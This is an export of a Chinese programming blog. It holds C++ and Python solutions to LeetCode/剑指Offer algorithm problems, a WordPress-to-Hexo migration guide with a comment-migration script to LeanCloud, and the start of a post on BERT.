&#x3D; &quot;abcdefg&quot;, k &#x3D; 2&gt;输出: &quot;cdefgab&quot; 示例 2： 12&gt;输入: s &#x3D; &quot;lrloseumgh&quot;, k &#x3D; 6&gt;输出: &quot;umghlrlose&quot; 限制： 1 &lt;= k &lt; s.length &lt;= 10000 看代码吧。。太水了 c++ 123456class Solution &#123;public: string reverseLeftWords(string s, int n) &#123; return s.substr(n, s.size() - n) + s.substr(0, n); &#125;&#125;; Python 123class Solution: def reverseLeftWords(self, s: str, n: int) -&gt; str: return s[n:] + s[:n] 59 - I. 滑动窗口的最大值 给定一个数组 nums 和滑动窗口的大小 k，请找出所有滑动窗口里的最大值。 示例: 123456789101112&gt;输入: nums &#x3D; [1,3,-1,-3,5,3,6,7], 和 k &#x3D; 3&gt;输出: [3,3,5,5,6,7] &gt;解释: 滑动窗口的位置 最大值&gt;--------------- -----&gt;[1 3 -1] -3 5 3 6 7 31 [3 -1 -3] 5 3 6 7 31 3 [-1 -3 5] 3 6 7 51 3 -1 [-3 5 3] 6 7 51 3 -1 -3 [5 3 6] 7 61 3 -1 -3 5 [3 6 7] 7 提示： 你可以假设 k 总是有效的，在输入数组不为空的情况下，1 ≤ k ≤ 输入数组的大小。 注意：本题与主站 239 题相同：https://leetcode-cn.com/problems/sliding-window-maximum/ 维护一个单调队列，题解详情还有分块法见另外一篇题解sliding-window-maximum 12345678910111213141516171819202122232425class Solution &#123;public: vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) &#123; if (nums.empty()) return &#123;&#125;; deque&lt;int&gt; q; for (int i = 0; i &lt; k; ++i) &#123; while (!q.empty() &amp;&amp; nums[i] &gt; nums[q.back()]) &#123; q.pop_back(); &#125; q.emplace_back(i); &#125; vector&lt;int&gt; ans = &#123;nums[q.front()]&#125;; for (int i = k; i &lt; nums.size(); ++i) &#123; if (q.front() + k &lt;= i) &#123; q.pop_front(); &#125; while (!q.empty() &amp;&amp; nums[i] &gt; nums[q.back()]) &#123; q.pop_back(); &#125; q.emplace_back(i); ans.emplace_back(nums[q.front()]); &#125; return ans; &#125;&#125;; 59 - II. 队列的最大值 请定义一个队列并实现函数 max_value 得到队列里的最大值，要求函数max_value、push_back 和 pop_front 的均摊时间复杂度都是O(1)。 若队列为空，pop_front 和 max_value 需要返回 -1 示例 1： 1234&gt;输入: &gt;[&quot;MaxQueue&quot;,&quot;push_back&quot;,&quot;push_back&quot;,&quot;max_value&quot;,&quot;pop_front&quot;,&quot;max_value&quot;]&gt;[[],[1],[2],[],[],[]]&gt;输出: [null,null,null,2,1,2] 示例 2： 1234&gt;输入: &gt;[&quot;MaxQueue&quot;,&quot;pop_front&quot;,&quot;max_value&quot;]&gt;[[],[],[]]&gt;输出: [null,-1,-1] 限制： 1 &lt;= push_back,pop_front,max_value的总操作数 &lt;= 10000 1 &lt;= value &lt;= 10^5 和上一题一样，维护一个单调队列即可 1234567891011121314151617181920212223242526272829class MaxQueue &#123; deque&lt;int&gt; _q; deque&lt;int&gt; _nums;public: MaxQueue() &#123;&#125; int max_value() &#123; if (_nums.empty()) return -1; return _q.front(); &#125; void push_back(int value) &#123; while (!_q.empty() &amp;&amp; _q.back() &lt; value) &#123; _q.pop_back(); &#125; _q.push_back(value); _nums.push_back(value); &#125; int pop_front() &#123; if (_nums.empty()) return -1; int temp = _nums[0]; _nums.pop_front(); if (temp == _q.front()) &#123; _q.pop_front(); &#125; return temp; &#125;&#125;; 60. n个骰子的点数 把n个骰子扔在地上，所有骰子朝上一面的点数之和为s。输入n，打印出s的所有可能的值出现的概率。 你需要用一个浮点数数组返回答案，其中第 i 个元素代表这 n 个骰子所能掷出的点数集合中第 i 小的那个的概率。 示例 1: 12&gt;输入: 1&gt;输出: [0.16667,0.16667,0.16667,0.16667,0.16667,0.16667] 示例 2: 12&gt;输入: 2&gt;输出: [0.02778,0.05556,0.08333,0.11111,0.13889,0.16667,0.13889,0.11111,0.08333,0.05556,0.02778] 限制： 1&gt;1 &lt;&#x3D; n &lt;&#x3D; 11 明显是个dp的过程。一个骰子的时候范围从[1, 6], 两个骰子从[2, 12]， 也就是n个骰子从[n, 6 * n]. 设dp[i][j]为i个骰子和为j的概率，则dp[i][j + x] += dp[i - 1][j] * 1.0 / 6.0， 其中，\\(x \\in [1,6]\\)表示这一层可能的取值，而dp[i - 1][j]就是上一层和为j的概率。 另外，空间复杂度可以优化为O(n) 1234567891011121314151617class Solution &#123;public: vector&lt;double&gt; dicesProbability(int n) &#123; vector&lt;double&gt; last(1, 1.0); for (int i = 1; i &lt;= n; ++i) &#123; vector&lt;double&gt; dp(6 * i + 1, 0.0); for (int j = i - 1; j &lt;= (i - 1) * 6; ++j) &#123; for (int x = 1; x &lt;= 6; ++x) &#123; dp[j + x] += last[j] / 6.0; &#125; &#125; last = dp; &#125; vector&lt;double&gt; ans(last.begin() + n, last.end()); return ans; &#125;&#125;; 61. 扑克牌中的顺子 从扑克牌中随机抽5张牌，判断是不是一个顺子，即这5张牌是不是连续的。2～10为数字本身，A为1，J为11，Q为12，K为13，而大、小王为 0 ，可以看成任意数字。A 不能视为 14。 示例 1: 12&gt;输入: [1,2,3,4,5]&gt;输出: True 示例 2: 12&gt;输入: [0,0,1,2,5]&gt;输出: True 限制： 数组长度为 5 数组的数取值为 [0, 13] . 简单的思路：排序看看大小王的数目，看看两个数的差值是不是可以用大小王来填补（这里需要注意两个数相等的情况） 123456789101112131415161718class Solution &#123;public: bool isStraight(vector&lt;int&gt;&amp; nums) &#123; sort(nums.begin(), nums.end()); std::size_t start = 0; while (start &lt; nums.size() &amp;&amp; nums[start] == 0) &#123; ++start; &#125; int zero_num = start; for (std::size_t i = start; i + 1 &lt; nums.size(); ++i) &#123; if (nums[i] + 1 == nums[i + 1]) &#123; continue; &#125; int need_zero = nums[i + 1] - nums[i] - 1; if (need_zero &gt; zero_num || need_zero == -1) &#123; return false; &#125; zero_num -= need_zero; &#125; return true; &#125;&#125;; 方法2：排序，看大小王的个数就能得到数组中最小的元素，然后max - min &lt; 5说明有解 123456789101112class Solution &#123;public: bool isStraight(vector&lt;int&gt;&amp; nums) &#123; sort(nums.begin(), nums.end()); int num_joker = 0; for (std::size_t i = 0; i &lt; nums.size(); ++i) &#123; if (nums[i] == 0) ++ num_joker; else if (i + 1 &lt; nums.size() &amp;&amp; nums[i] == nums[i + 1]) return false; &#125; return nums.back() - nums[num_joker] &lt; 5; &#125;&#125;; 62. 圆圈中最后剩下的数字 0,1,...,n-1这n个数字排成一个圆圈，从数字0开始，每次从这个圆圈里删除第m个数字。求出这个圆圈里剩下的最后一个数字。 例如，0、1、2、3、4这5个数字组成一个圆圈，从数字0开始每次删除第3个数字，则删除的前4个数字依次是2、0、4、1，因此最后剩下的数字是3。 示例 1： 12&gt;输入: n &#x3D; 5, m &#x3D; 3&gt;输出: 3 示例 2： 12&gt;输入: n &#x3D; 10, m &#x3D; 17&gt;输出: 2 限制： 1 &lt;= n &lt;= 10^5 1 &lt;= m &lt;= 10^6 这道题其实就是经典的约瑟夫问题。 以[0, 1, 2, 3, 4]这个为例，删除的过程如下： 123456 0 1 2 3 4[0, 1, 2, 3, 4] 删除[3, 4, 0, 1] 重新编号，删除0[1, 3, 4] 重新编号，删除4[1, 3, 1, 3] 重新编号，删除1[3] 重新编号相当于把整个数组往前移动了m位，因此我们是可以从最后的结果反推出一开始的下标的： 12345最后剩下的3下标为0，1. 上一轮其下标应该是： (0 + m) % 2 &#x3D; 1 &#x2F;&#x2F; 2为上一轮长度，所以这样2. 在上一轮下表应该是: (1 + m) % 3 &#x3D; 13. 继续往上有4个元素， (1 + m) % 4 &#x3D; 04. 最后为 (0 + m) % 5 &#x3D; 3 因此代码就很简单了： 12345678910class Solution &#123;public: int lastRemaining(int n, int m) &#123; int ans = 0; for (int i = 2; i &lt;= n; ++i) &#123; ans = (ans + m) % i; &#125; return ans; &#125;&#125;; 63. 股票的最大利润 假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖该股票一次可能获得的最大利润是多少？ 示例 1: 1234&gt;输入: [7,1,5,3,6,4]&gt;输出: 5&gt;解释: 在第 2 天（股票价格 &#x3D; 1）的时候买入，在第 5 天（股票价格 &#x3D; 6）的时候卖出，最大利润 &#x3D; 6-1 &#x3D; 5 。 注意利润不能是 7-1 &#x3D; 6, 因为卖出价格需要大于买入价格。 示例 2: 123&gt;输入: [7,6,4,3,1]&gt;输出: 0&gt;解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 限制： 1&gt;0 &lt;&#x3D; 数组长度 &lt;&#x3D; 10^5 注意：本题与主站 121 题相同：https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/ 维护一个当前i之前的最小价格，然后看看当前卖出的利润prices[i] - cur_min是否为解即可 12345678910111213class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if (prices.empty()) return 0; int ans = 0; int cur_min = prices.front(); for (std::size_t i = 0; i &lt; prices.size(); ++i) &#123; ans = max(ans, prices[i] - cur_min); cur_min = min(prices[i], cur_min); &#125; return ans; &#125;&#125;; 64. 求1+2+…+n 求 1+2+...+n ，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。 示例 1： 12&gt;输入: n &#x3D; 3&gt;输出: 6 示例 2： 12&gt;输入: n &#x3D; 9&gt;输出: 45 限制： 1 &lt;= n &lt;= 10000 方法1，递归 1234567class Solution &#123;public: int sumNums(int n) &#123; n &amp;&amp; (n += sumNums(n - 1)); return n; &#125;&#125;; 方法2：俄罗斯农民乘法 小学数学是这样的： 1234567 88x 99---------- 792+792---------- 8712 可以表示为 12388 * 99 &#x3D; 88 * 9 * 10^0 + 88 * 9 * 10^1 &#x3D; 792 + 7920 &#x3D; 8712 如果将第二个数表示为二进制，则有 1234567888 * 0110 0011(2) &#x3D; 88 * 0 * 2^7 + 88 * 1 * 2^6 + 88 * 1 * 2^5 + 88 * 0 * 2^4 + 88 * 0 * 2^3 + 88 * 0 * 2^2 + 88 * 1 * 2^1 + 88 * 1 * 2^0 因此可以写出如下quick_mul的代码，这里也弄了个quick_pow的代码供对比，基本上是比较类似的。 123456789101112131415161718192021222324252627282930class Solution &#123; int quick_pow(int n, int t) &#123; int res = 1; while (t) &#123; if (t &amp; 1) &#123; res = res * n; &#125; n *= n; t &gt;&gt;= 1; &#125; return res; &#125; int quick_mul(int a, int b) &#123; int ans = 0; while (b) &#123; if (b &amp; 1) &#123; ans += a; &#125; b &gt;&gt;= 1; a &lt;&lt;= 1; &#125; return ans; &#125;public: int sumNums(int n) &#123; return quick_mul(n, n + 1) &gt;&gt; 1; &#125;&#125;; 那么不用乘法和while怎么做？n 二进制展开最多不会超过 14 位，我们手动展开 14 层代替循环即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667class Solution &#123; int quick_mul(int a, int b) &#123; int ans = 0; //1 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //2 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //3 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //4 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //5 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //6 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //7 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //8 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //9 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //10 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //11 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //12 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //13 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; //14 (b &amp; 1) &amp;&amp; (ans += a); b &gt;&gt;= 1; a &lt;&lt;= 1; return ans; &#125;public: int sumNums(int n) &#123; return quick_mul(n, n + 1) &gt;&gt; 1; &#125;&#125;; 65. 不用加减乘除做加法 难度简单106 写一个函数，求两个整数之和，要求在函数体内不得使用 “+”、“-”、“*”、“/” 四则运算符号。 示例: 12&gt;输入: a &#x3D; 1, b &#x3D; 1&gt;输出: 2 提示： a, b 均可能是负数或 0 结果不会溢出 32 位整数 方法1 异或操作符可以理解为%2加法，因此可以利用这个性质按位加 12345678910111213141516171819class Solution &#123;public: int add(int a, int b) &#123; int ans = 0; int flag = 0; for (int i = 0; i &lt; 32; ++i) &#123; int x = (a &gt;&gt; i) &amp; 1; int y = (b &gt;&gt; i) &amp; 1; int t = x ^ y ^ flag; if (x == 1 &amp;&amp; y == 1 || x == 1 &amp;&amp; flag == 1 || y == 1 &amp;&amp; flag == 1) &#123; flag = 1; &#125; else &#123; flag = 0; &#125; ans |= t &lt;&lt; i; &#125; return ans; &#125;&#125;; 方法2 其实可以更快一些，a ^ b的时候若两个位的数字相同，则结果变成了0，此时需要进位，而我们可以容易求得这些进位的位置为a &amp; b​，然后下一次计算加上a &amp; b &lt;&lt; 1即可，直到进位为0就得到了最后的结果。 1234567891011class Solution &#123;public: int add(int a, int b) &#123; while (b != 0) &#123; int c = (unsigned int)(a &amp; b) &lt;&lt; 1; a ^= b; b = c; &#125; return a; &#125;&#125;; 66. 构建乘积数组 给定一个数组 A[0,1,…,n-1]，请构建一个数组 B[0,1,…,n-1]，其中 B 中的元素 B[i]=A[0]×A[1]×…×A[i-1]×A[i+1]×…×A[n-1]。不能使用除法。 示例: 12&gt;输入: [1,2,3,4,5]&gt;输出: [120,60,40,30,24] 提示： 所有元素乘积之和不会溢出 32 位整数 a.length &lt;= 100000 构建两个数组left和right，left[i]表示从0到i的乘积，right[i]表示从n - 1到i的乘积，因此答案就是left[i - 1] * right[i + 1] 123456789101112131415161718192021222324252627class Solution &#123;public: vector&lt;int&gt; constructArr(vector&lt;int&gt;&amp; a) &#123; if (a.empty()) return &#123;&#125;; if (a.size() &lt; 2) return &#123;0&#125;; int n = a.size(); vector&lt;int&gt; left(n); vector&lt;int&gt; right(n); left[0] = a[0]; right.back() = a.back(); for (int i = 1; i &lt; n; ++i) &#123; left[i] = left[i - 1] * a[i]; right[n - i - 1] = right[n - i] * a[n - i - 1]; &#125; vector&lt;int&gt; ans(n); for (int i = 0; i &lt; n; ++i) &#123; if (i == 0) &#123; ans[i] = right[i + 1]; &#125; else if (i == n - 1)&#123; ans[i] = left[i - 1]; &#125; else &#123; ans[i] = left[i - 1] * right[i + 1]; &#125; &#125; return ans; &#125;&#125;; 68 - I. 二叉搜索树的最近公共祖先 给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。 百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉搜索树: root = [6,2,8,0,4,7,9,null,null,3,5] img 示例 1: 123&gt;输入: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 8&gt;输出: 6 &gt;解释: 节点 2 和节点 8 的最近公共祖先是 6。 示例 2: 123&gt;输入: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 4&gt;输出: 2&gt;解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。 说明: 所有节点的值都是唯一的。 p、q 为不同节点且均存在于给定的二叉搜索树中。 注意：本题与主站 235 题相同：https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/ 12345678910111213141516class Solution &#123;public: TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123; if (p-&gt;val &gt; q-&gt;val) return lowestCommonAncestor(root, q, p); while (root) &#123; if (p-&gt;val &lt;= root-&gt;val &amp;&amp; root-&gt;val &lt;= q-&gt;val) &#123; return root; &#125; else if (p-&gt;val &gt; root-&gt;val) &#123; root = root-&gt;right; &#125; else &#123; root = root-&gt;left; &#125; &#125; return nullptr; &#125;&#125;; 68 - II. 二叉树的最近公共祖先 给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。 百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉树: root = [3,5,1,6,2,0,8,null,null,7,4] img 示例 1: 123&gt;输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 1&gt;输出: 3&gt;解释: 节点 5 和节点 1 的最近公共祖先是节点 3。 示例 2: 123&gt;输入: root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 4&gt;输出: 5&gt;解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。 说明: 所有节点的值都是唯一的。 p、q 为不同节点且均存在于给定的二叉树中。 注意：本题与主站 236 题相同：https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/ 题解见本博客另外一篇文章 二叉树最近公共祖先详解（LCA问题详解） 12345678910class Solution &#123;public: TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123; if (!root || root == p || root == q) return root; TreeNode* left = lowestCommonAncestor(root-&gt;left, p, q); TreeNode* right = lowestCommonAncestor(root-&gt;right, p, q); if (left &amp;&amp; right) return root; return left ? left : right; &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"wordpress迁移到hexo填坑记录 (2020.11版)","slug":"wordpress-to-hexo","date":"2020-11-02T14:43:38.000Z","updated":"2020-11-08T13:03:41.252Z","comments":true,"path":"wordpress-to-hexo/","link":"","permalink":"https://www.hrwhisper.me/wordpress-to-hexo/","excerpt":"阮一峰说，喜欢写Blog的人，会经历三个阶段： 第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。 第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。 第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。 我现在大概就是处在第三的阶段，一开始我用CSDN写，后来感觉有时候还经常挂掉，页面也不好看，就改成了wordpress；工作后，写blog的时间更少了，而wordpress不支持markdown, 每次我都要用pandoc将markdown转成html，然后在复制进去，维护困难，时间一久就没写blog的兴趣了；而且国外的服务器访问也比较慢（还要花钱），于是近期就转成了hexo，感觉挺好，因此记录下wordpress转成hexo的过程。","text":"阮一峰说，喜欢写Blog的人，会经历三个阶段： 第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。 第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。 第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。 我现在大概就是处在第三的阶段，一开始我用CSDN写，后来感觉有时候还经常挂掉，页面也不好看，就改成了wordpress；工作后，写blog的时间更少了，而wordpress不支持markdown, 每次我都要用pandoc将markdown转成html，然后在复制进去，维护困难，时间一久就没写blog的兴趣了；而且国外的服务器访问也比较慢（还要花钱），于是近期就转成了hexo，感觉挺好，因此记录下wordpress转成hexo的过程。 转换工具 hexo提供了从WordPress转换的工具hexo-migrator-wordpress，使用的方法如下： 1hexo migrate wordpress WordPress.2020-09-17.xml --paragraph-fix --import-image --skipduplicate 但是这个插件有一些坑，我做了一些处理： &lt;pre&gt;标签处理 代码块原来处理可能有些问题，修改blog/node_modules/hexo-migrator-wordpress/migrator.js的代码，添加规则， 1234567tomd.addRule(&#x27;code_block&#x27;, &#123; filter: &#x27;pre&#x27;, //(node) =&gt; node.nodeName === &#x27;PRE&#x27;, // &#x27;pre&#x27; || (node.innerHTML.toString().toLowerCase().indexOf(&#x27;&lt;pre &#x27;) != -1), replacement: function (content, node, options) &#123; return &#x27;\\n\\n&#x27; + options.fence + &#x27;\\n&#x27; + content + &#x27;\\n&#x27; + options.fence + &#x27;\\n\\n&#x27;; &#125; &#125;); 保留\\n 默认turndown会把\\n替换为空格，导致原来文章看起来有些奇怪，可以修改turndown的源代码，turndown.cjs.js: 123var text = node.data.replace(/[ \\r\\n\\t]+/g, &#x27; &#x27;);修改为var text = node.data.replace(/[ \\r\\t]+/g, &#x27; &#x27;); 参考https://github.com/domchristie/turndown/issues/264 重写turndown.cjs.js的 escape函数 12345678910escape: function (string) &#123; return escapes.reduce(function (accumulator, escape) &#123; return accumulator.replace(escape[0], function(s) &#123; if (!s.startsWith(&#x27;&lt;pre&#x27;)) &#123; s.replace(escape[0], escape[1]); &#125; return s; &#125;) &#125;, string) &#125; 自定义url 由于我原来的url是自定义的一个，有助于SEO, 而hexo默认文件名为URL，感觉不太适应，因此可以加入自定义的字段： 在posts.push(data)之前加入，hexo调用create函数的时候就会自动的加上该字段： 1data.custom_url = parseUrl(link).pathname.replace(/\\//g, &#x27;&#x27;); 然后在_config.yml中修改permalink字段即可 1permalink: :custom_url/ 修改后的的代码放在了github上：hrwhisper/hexo-migrator-wordpress 图片地址转换 为了有效的管理文章的图片，可以在_config.yml中设置post_asset_folder，在使用hexo migrate wordpress WordPress.2020-09-17.xml --paragraph-fix --import-image --skipduplicate 命令，这样，会将原来blog的图片也下载到source/_post/title_dic下，这样和编辑器typora不兼容，typora无法正常的显示图片！ 为了解决这个问题，可以将文章中的路径转换到source/images下，我是这么做的： 123mv _post&#x2F;* imagesmv images&#x2F;*.md _postpython3 image_path_fix.py image_path_fix这个脚本主要是 识别出图片的地址，然后修改为移动后的地址 对各个文件的图片地址进行get, 看地址是否合法 （需要hexo s命令支持） 这个脚本也在 hrwhisper/hexo-migrator-wordpress 这个网址里 评论迁移 原来的博客有很多的评论，换成Hexo如果丢掉那就太可惜了，因此我进行了评论的迁移。 一开始先在wordpress中安装disque插件，然后用https://github.com/taosky/disqus-to-valine的代码导入valine，但是wordpress page的评论丢失了，并且总数上不对（我有900左右的评论，结果导入后剩下了500多。。） 因此，我决定自己写一个：思路如下： 读取mysql的comment的数据 参考了leancloud的API进行保存 主要注意的是，wordpress中回复采用了comment_parent字段，而valine中采用了pid和rid, 这两个id都是Lean cloud评论的objectid，因此按comment_ID从小到大变量，同时保存其在Leancloud上的objectid，然后在comment_parent不为0的时候，写入父节点对应的pid = objectid即可。 另外我有一些文章的url在迁移过程中进行了修改，主要是原来一些中文的url，因此我将转换前后的url保存为一个csv文件，然后读取替换url，csv格式如下： 1messageboard,留言板,about-me 代码也在 hrwhisper/hexo-migrator-wordpress 仓库中 ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104from dataclasses import dataclassimport codecsimport pymysqlimport leancloud@dataclassclass CommentData: post_name: str comment_ID: int comment_post_ID: int comment_author: str comment_author_email: str comment_author_url: str comment_author_IP: str comment_date: str comment_date_gmt: str comment_content: str comment_karma: int comment_approved: int comment_agent: str comment_type: str comment_parent: int user_id: int comment_mail_notify: int# url may change title_change = &#123;&#125;with codecs.open(&#x27;title-change.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: for line in f: line = line.strip() if line: line = line.split(&#x27;,&#x27;) title_change[line[0]] = line[2]print(title_change)# get all commentdb = pymysql.connect(&quot;localhost&quot;,&quot;username&quot;,&quot;password&quot;,&quot;wordpress&quot; )cursor = db.cursor()cursor.execute(&quot;SELECT p.post_name, c.* FROM `wp_comments` c , `wp_posts` p WHERE c.comment_post_ID = p.ID&quot;)results = cursor.fetchall()comment_list = []for row in results: data = CommentData(*row) data.comment_date = data.comment_date.isoformat() if data.post_name in title_change: data.post_name = title_change[data.post_name] comment_list.append(data)db.close()&quot;&quot;&quot;&#123; &quot;nick&quot;: &quot;12515&quot;, &quot;ip&quot;: &quot;39.155.192.81&quot;, &quot;ACL&quot;: &#123; &quot;*&quot;: &#123; &quot;read&quot;: true &#125; &#125;, &quot;mail&quot;: &quot;125125&quot;, &quot;ua&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36&quot;, &quot;insertedAt&quot;: &#123; &quot;__type&quot;: &quot;Date&quot;, &quot;iso&quot;: &quot;2020-11-05T15:18:14.128Z&quot; &#125;, &quot;pid&quot;: &quot;5fa417827e502a242397edc3&quot;, &quot;link&quot;: &quot;112&quot;, &quot;comment&quot;: &quot;1111\\n&quot;, &quot;url&quot;: &quot;/about-me/&quot;, &quot;QQAvatar&quot;: &quot;&quot;, &quot;rid&quot;: &quot;5fa417827e502a242397edc3&quot;, &quot;objectId&quot;: &quot;5fa417b6ab05356ee26b9bfc&quot;, &quot;createdAt&quot;: &quot;2020-11-05T15:18:14.503Z&quot;, &quot;updatedAt&quot;: &quot;2020-11-05T15:18:14.503Z&quot;&#125;&quot;&quot;&quot;leancloud.init(&quot;APPKEY&quot;, &quot;APPKEY&quot;)TestObject = leancloud.Object.extend(&#x27;Comment&#x27;)coment_object_id = &#123;&#125;comment_list.sort(key=lambda x: x.comment_ID)for comment in comment_list: test_object = TestObject() test_object.set(&#x27;nick&#x27;, comment.comment_author) test_object.set(&#x27;insertedAt&#x27;, &#123; &quot;__type&quot;: &quot;Date&quot;, &quot;iso&quot;: comment.comment_date &#125;) test_object.set(&#x27;status&#x27;, 1) test_object.set(&#x27;comment&#x27;, comment.comment_content) test_object.set(&#x27;comment_id&#x27;, comment.comment_ID) test_object.set(&#x27;mail&#x27;, comment.comment_author_email) test_object.set(&#x27;ua&#x27;, comment.comment_agent) test_object.set(&#x27;ip&#x27;, comment.comment_author_IP) test_object.set(&#x27;url&#x27;, &#x27;/&#123;&#125;/&#x27;.format(comment.post_name)) test_object.fetch_when_save = True if comment.comment_parent != 0: test_object.set(&#x27;pid&#x27;, coment_object_id[comment.comment_parent]) test_object.set(&#x27;rid&#x27;, coment_object_id[comment.comment_parent]) try: test_object.save() coment_object_id[comment.comment_ID] = test_object.get(&#x27;objectId&#x27;) except leancloud.LeanCloudError as e: print(&#x27;error&#x27;, e, comment) mathjax hexo对mathjax的支持也不是特别的好，还有各种引擎的不同，一一尝试后，发现hexo-renderer-kramed很久没维护，mathjax显示Ok了，但是其他的东西可能就不正常了，最后用了hexo-renderer-pandoc基本解决了问题。 12npm uninstall hexo-renderer-marked --savenpm install hexo-renderer-pandoc --save https 独立的域名怎么开启https呢？ 这里主要参考了: 为Github的Hexo博客启用SSL/TLS 主要步骤是： 注册CloudFlare，添加个人网站，获取CLoudFlare提供的Nameservers; 修改自己的域名提供商（如阿里云），把站点的Nameservers服务器修改为CloudFlare提供的Nameservers； 等待CloudFlare添加的网站为激活状态，使用https打开个人网站； Sitemap 安装下面的插件： 12npm install hexo-generator-sitemap --savenpm install hexo-generator-baidu-sitemap --save 然后配置博客根目录下的_config.yml 12345baidusitemap: path: baidusitemap.xmlsitemap: path: sitemap.xml 在google和baidu中提交sitemap地址即可，如我的地址是http://hrwhisper.me/sitemap.xml 其它参考资料 博客从 WordPress 转到 Hexo wordpress迁移到hexo的不完全填坑指南(2018) typora + hexo博客中插入图片 评论系统从Disqus迁移到Valine hexo博客的URL优化","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.hrwhisper.me/tags/hexo/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://www.hrwhisper.me/tags/Wordpress/"}]},{"title":"【深度学习】BERT","slug":"deep-learning-bert","date":"2020-04-06T13:50:16.000Z","updated":"2021-01-31T14:38:48.109Z","comments":true,"path":"deep-learning-bert/","link":"","permalink":"https://www.hrwhisper.me/deep-learning-bert/","excerpt":"BERT英文全称是：Bidirectional Encoder Representations from Transformers，即双向Transformer的encoder。 BERT提出的时候刷新了11项NLP任务的记录，可以说开创了一个新的时代。","text":"BERT英文全称是：Bidirectional Encoder Representations from Transformers，即双向Transformer的encoder。 BERT提出的时候刷新了11项NLP任务的记录，可以说开创了一个新的时代。 不熟悉word2vec的和Transformer的可以看我博客相关文章： Word2Vec Attention is All You Need : Transformer模型 词向量对比 从word2vec到ELMo在到Bert发生了什么变化呢？这里引用【NLP】彻底搞懂BERT的评价： word2vec——&gt;ELMo： 结果：上下文无关的static向量变成上下文相关的dynamic向量，比如苹果在不同语境vector不同 操作：encoder操作转移到预训练产生词向量过程实现 ELMo——&gt;BERT： 结果：训练出的word-level向量变成sentence-level的向量，下游具体NLP任务调用更方便，修正了ELMo模型的潜在问题 操作：使用句子级负采样获得句子表示/句对关系，Transformer模型代替LSTM提升表达和时间上的效率，masked LM解决“自己看到自己”的问题 下面会讲讲ELMo，然后在讲解BERT 